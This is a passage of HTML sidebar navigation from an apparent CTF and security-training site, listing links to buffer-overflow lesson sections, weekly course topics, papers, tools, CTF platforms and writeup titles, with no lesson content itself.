      </ul>
    </nav>
  
</li>
        
          <li class="md-nav__item">
  <a href="#overwrite-values-on-stack" class="md-nav__link">
    Overwrite values on stack
  </a>
  
    <nav class="md-nav" aria-label="Overwrite values on stack">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#breakdown" class="md-nav__link">
    Breakdown
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#solution" class="md-nav__link">
    Solution
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#shellcode" class="md-nav__link">
    Shellcode
  </a>
  
    <nav class="md-nav" aria-label="Shellcode">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#disabling-aslr" class="md-nav__link">
    Disabling ASLR
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-the-buffer-in-memory" class="md-nav__link">
    Finding the Buffer in Memory
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#finding-the-padding" class="md-nav__link">
    Finding the Padding
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#putting-it-all-together" class="md-nav__link">
    Putting it all together
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#final-exploit" class="md-nav__link">
    Final Exploit
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#find-shellcode-online" class="md-nav__link">
    Find Shellcode Online
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exercise" class="md-nav__link">
    Exercise
  </a>
  
    <nav class="md-nav" aria-label="Exercise">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#5-pt-smash-the-stack" class="md-nav__link">
    (5 pt) Smash the stack
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#5-pt-check-and-overlap" class="md-nav__link">
    (5 pt) Check and overlap
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#bonus-5-pt-perfectly-secure-from-shellcode" class="md-nav__link">
    (BONUS 5 pt) Perfectly secure from shellcode
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%203/" class="md-nav__link">
        Week3 PWN: Advanced Buffer Overflow
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%204/" class="md-nav__link">
        Week4 WEB: Information Discovery
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%205/" class="md-nav__link">
        Week5 WEB: Vulnerability Exploit
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%206/" class="md-nav__link">
        Week6 RE: De-compiling Program
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%207/" class="md-nav__link">
        Week7 WLAN: Attacking WiFi
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%208/" class="md-nav__link">
        Week8 MISC: Physical Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%209/" class="md-nav__link">
        Week9 MISC: Social Engineering
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%2010/" class="md-nav__link">
        Week10 PWN: Privilege Escalation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%2011/" class="md-nav__link">
        Week11 CRYPTO: Public Key Crypto Attacking
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%2012/" class="md-nav__link">
        Week12 WEB: Attacking Websites
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%2013/" class="md-nav__link">
        Week13 PWN: ROL and ROP
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Week%2014/" class="md-nav__link">
        Week14 CTF: Attack-Defense CTF
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../Exercise%20Solutions/" class="md-nav__link">
        Exercise Solutions
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" type="checkbox" id="__nav_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4">
          Paper
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Paper" data-md-level="1">
        <label class="md-nav__title" for="__nav_4">
          <span class="md-nav__icon md-icon"></span>
          Paper
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_1" type="checkbox" id="__nav_4_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_1">
          Artificial Intelligence
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Artificial Intelligence" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_1">
          <span class="md-nav__icon md-icon"></span>
          Artificial Intelligence
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/" class="md-nav__link">
        Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Artificial%20Intelligence/Unleashing%20the%20Tiger%20Inference%20Attacks%20on%20Split%20Learning/" class="md-nav__link">
        Unleashing the Tiger Inference Attacks on Split Learning
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_2" type="checkbox" id="__nav_4_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_2">
          Cryptography
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Cryptography" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_2">
          <span class="md-nav__icon md-icon"></span>
          Cryptography
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Cryptography/Fuzzy%20Message%20Detection/" class="md-nav__link">
        Fuzzy Message Detection
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Cryptography/Key%20Agreement%20for%20Decentralized%20Secure%20Group%20Messaging%20with%20Strong%20Security%20Guarantees/" class="md-nav__link">
        Key Agreement for Decentralized Secure Group Messaging with Strong Security Guarantees
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_3" type="checkbox" id="__nav_4_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_3">
          Internet of Things
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Internet of Things" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_3">
          <span class="md-nav__icon md-icon"></span>
          Internet of Things
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Internet%20of%20Things/Snipuzz%20Black-box%20Fuzzing%20of%20IoT%20Firmware%20via%20Message%20Snippet%20Inference/" class="md-nav__link">
        Snipuzz: Black-box Fuzzing of IoT Firmware via Message Snippet Inference
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_4" type="checkbox" id="__nav_4_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_4">
          Misc
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Misc" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_4">
          <span class="md-nav__icon md-icon"></span>
          Misc
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Misc/Chaff%20Bugs%20Deterring%20Attackers%20by%20Making%20Software%20Buggier/" class="md-nav__link">
        Chaff Bugs: Deterring Attackers by Making Software Buggier
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_5" type="checkbox" id="__nav_4_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_5">
          Mobile
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Mobile" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_5">
          <span class="md-nav__icon md-icon"></span>
          Mobile
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Mobile/Consistency%20Analysis%20of%20Data-Usage%20Purposes%20in%20Mobile%20Apps/" class="md-nav__link">
        Consistency Analysis of Data-Usage Purposes in Mobile Apps
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_6" type="checkbox" id="__nav_4_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_6">
          PWN
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="PWN" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_6">
          <span class="md-nav__icon md-icon"></span>
          PWN
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/PWN/Exorcising%20Spectres%20with%20Secure%20Compilers/" class="md-nav__link">
        Exorcising Spectres with Secure Compilers
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/PWN/Preventing%20Dynamic%20Library%20Compromise%20on%20Node.js%20via%20RWX-Based%20Privilege%20Reduction/" class="md-nav__link">
        Preventing Dynamic Library Compromise on Node.js via RWX-Based Privilege Reduction
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_7" type="checkbox" id="__nav_4_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_4_7">
          Reverse Engineering
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="2">
        <label class="md-nav__title" for="__nav_4_7">
          <span class="md-nav__icon md-icon"></span>
          Reverse Engineering
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Paper/Reverse%20Engineering/Search-based%20Approaches%20for%20Local%20Black-Box%20Code%20Deobfuscation%20Understand%2C%20Improve%20and%20Mitigate/" class="md-nav__link">
        Search-based Approaches for Local Black-Box Code Deobfuscation Understand, Improve and Mitigate
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5" type="checkbox" id="__nav_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5">
          Tool
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Tool" data-md-level="1">
        <label class="md-nav__title" for="__nav_5">
          <span class="md-nav__icon md-icon"></span>
          Tool
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5_1" type="checkbox" id="__nav_5_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5_1">
          Cryptography
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Cryptography" data-md-level="2">
        <label class="md-nav__title" for="__nav_5_1">
          <span class="md-nav__icon md-icon"></span>
          Cryptography
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/Cryptography/SageMathCell/" class="md-nav__link">
        SageMathCell
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5_2" type="checkbox" id="__nav_5_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5_2">
          PWN
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="PWN" data-md-level="2">
        <label class="md-nav__title" for="__nav_5_2">
          <span class="md-nav__icon md-icon"></span>
          PWN
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/PWN/IDA/" class="md-nav__link">
        IDA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/PWN/PEiD/" class="md-nav__link">
        PEiD
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/PWN/WinDbg/" class="md-nav__link">
        WinDbg
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/PWN/WinHex/" class="md-nav__link">
        WinHex: Computer Forensics & Data Recovery Software, Hex Editor & Disk Editor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/PWN/x64dbg/" class="md-nav__link">
        x64dbg
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_5_3" type="checkbox" id="__nav_5_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_5_3">
          Reverse Engineering
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Reverse Engineering" data-md-level="2">
        <label class="md-nav__title" for="__nav_5_3">
          <span class="md-nav__icon md-icon"></span>
          Reverse Engineering
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/Reverse%20Engineering/Bytecode%20Viewer/" class="md-nav__link">
        Bytecode Viewer
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/Reverse%20Engineering/DiE/" class="md-nav__link">
        Detect it Easy (DiE)
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tool/Reverse%20Engineering/ExeInfoPE/" class="md-nav__link">
        ExeInfoPE
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6">
          Tutorial
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Tutorial" data-md-level="1">
        <label class="md-nav__title" for="__nav_6">
          <span class="md-nav__icon md-icon"></span>
          Tutorial
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_1" type="checkbox" id="__nav_6_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_1">
          Material
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Material" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_1">
          <span class="md-nav__icon md-icon"></span>
          Material
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Material/Binary%20Exploitation/" class="md-nav__link">
        Binary Exploitation
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Material/Cryptography/" class="md-nav__link">
        Modern Cryptography and Mathematics
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Material/Network/" class="md-nav__link">
        Computer Network
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Material/OS/" class="md-nav__link">
        Operating Systems
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Material/Penetration/" class="md-nav__link">
        Penetration Testing
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Material/Reverse/" class="md-nav__link">
        逆向工程与汇编语言
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6_2" type="checkbox" id="__nav_6_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_6_2">
          Schedule
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Schedule" data-md-level="2">
        <label class="md-nav__title" for="__nav_6_2">
          <span class="md-nav__icon md-icon"></span>
          Schedule
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Schedule/Summer/" class="md-nav__link">
        Summer Schedule 2021
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Schedule/2021Fall/" class="md-nav__link">
        2021 Fall Schedule
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Tutorial/Schedule/2022Spring/" class="md-nav__link">
        2022 Spring Time Schedule
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7">
          Website
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Website" data-md-level="1">
        <label class="md-nav__title" for="__nav_7">
          <span class="md-nav__icon md-icon"></span>
          Website
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_1" type="checkbox" id="__nav_7_1" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_1">
          Forum
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Forum" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_1">
          <span class="md-nav__icon md-icon"></span>
          Forum
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Forum/kanxue/" class="md-nav__link">
        看雪学院
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_2" type="checkbox" id="__nav_7_2" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_2">
          Platform
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Platform" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_2">
          <span class="md-nav__icon md-icon"></span>
          Platform
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/Cryptopals/" class="md-nav__link">
        Cryptopals Crypto Challenges
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/CTFHub/" class="md-nav__link">
        CTFHub
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/CTFlearn/" class="md-nav__link">
        CTFlearn
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/ctftime/" class="md-nav__link">
        ctftime
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/ichunqiu/" class="md-nav__link">
        ichunqiu
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/picoCTF/" class="md-nav__link">
        picoCTF
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/pwnabletw/" class="md-nav__link">
        pwnable.tw
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/TryHackMe/" class="md-nav__link">
        TryHackMe
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Platform/World%20of%20Attack%26Defense/" class="md-nav__link">
        World of Attack&Defense
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7_3" type="checkbox" id="__nav_7_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_7_3">
          Tutorial
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Tutorial" data-md-level="2">
        <label class="md-nav__title" for="__nav_7_3">
          <span class="md-nav__icon md-icon"></span>
          Tutorial
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Tutorial/CTF%20Field%20Guide/" class="md-nav__link">
        CTF Field Guide
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Tutorial/CTF%20Wiki/" class="md-nav__link">
        CTF Wiki
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Tutorial/ctf101/" class="md-nav__link">
        Capture The Flag 101
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Tutorial/how%20to%20become%20a%20hacker/" class="md-nav__link">
        How To Become A Hacker
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Tutorial/linux/" class="md-nav__link">
        Linux Tools Quick Tutorial
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Website/Tutorial/python/" class="md-nav__link">
        Python
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

    
      
      
      

  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8">
          Writeup
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Writeup" data-md-level="1">
        <label class="md-nav__title" for="__nav_8">
          <span class="md-nav__icon md-icon"></span>
          Writeup
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/" class="md-nav__link">
        Writeups
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/DiceCTF%202022/" class="md-nav__link">
        DiceCTF 2022 Author Writeups
      </a>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_3" type="checkbox" id="__nav_8_3" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_3">
          Binary Exploitation
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Binary Exploitation" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_3">
          <span class="md-nav__icon md-icon"></span>
          Binary Exploitation
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/beginner-generic-pwn-number-0/" class="md-nav__link">
        beginner-generic-pwn-number-0
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/collision/" class="md-nav__link">
        collision
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/fd/" class="md-nav__link">
        fd
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/printf-please/" class="md-nav__link">
        printf-please
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/ret2generic-flag-reader/" class="md-nav__link">
        ret2generic-flag-reader
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/ret2the-unknown/" class="md-nav__link">
        ret2the-unknown
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Binary%20Exploitation/simultaneity/" class="md-nav__link">
        simultaneity
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_4" type="checkbox" id="__nav_8_4" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_4">
          Cryptography
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Cryptography" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_4">
          <span class="md-nav__icon md-icon"></span>
          Cryptography
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/blowfishgame/" class="md-nav__link">
        blowfishgame
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/Dachshund%20Attacks/" class="md-nav__link">
        Dachshund Attacks
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/Exposure/" class="md-nav__link">
        Exposure
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/Guess/" class="md-nav__link">
        Guess
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/MedicalImage/" class="md-nav__link">
        MedicalImage
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/more_calc/" class="md-nav__link">
        more_calc
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/myRSA/" class="md-nav__link">
        myRSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/Random_RSA/" class="md-nav__link">
        Random_RSA
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/RSAssss/" class="md-nav__link">
        RSAssss
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/scissor/" class="md-nav__link">
        scissor
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/secret%20share/" class="md-nav__link">
        secret_share
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Cryptography/simpleRSA/" class="md-nav__link">
        simpleRSA
      </a>
    </li>
  

            
          
        </ul>
      </nav>
    </li>
  

            
          
            
              
  
  
  
    
    <li class="md-nav__item md-nav__item--nested">
      
      
        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8_5" type="checkbox" id="__nav_8_5" >
      
      
      
      
        <label class="md-nav__link" for="__nav_8_5">
          Forensics
          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <nav class="md-nav" aria-label="Forensics" data-md-level="2">
        <label class="md-nav__title" for="__nav_8_5">
          <span class="md-nav__icon md-icon"></span>
          Forensics
        </label>
        <ul class="md-nav__list" data-md-scrollfix>
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21%20II/" class="md-nav__link">
        Disk, disk, sleuth! II
      </a>
    </li>
  

            
          
            
              
  
  
  
    <li class="md-nav__item">
      <a href="../../Writeup/Forensics/Disk%2C%20disk%2C%20sleuth%21/" class="md-nav__link">
        Disk, disk, sleuth!
      </a>
    </li>
  

            
          
